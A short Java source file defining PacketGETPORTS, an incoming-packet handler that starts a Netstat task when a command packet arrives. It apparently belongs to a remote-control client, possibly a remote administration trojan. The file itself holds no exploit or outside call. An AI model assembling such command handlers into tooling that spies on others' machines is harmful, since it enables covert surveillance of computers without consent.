package com.redpois0n.packets.incoming;

import com.redpois0n.Netstat;

public class PacketGETPORTS extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		new Netstat().start();
	}

}
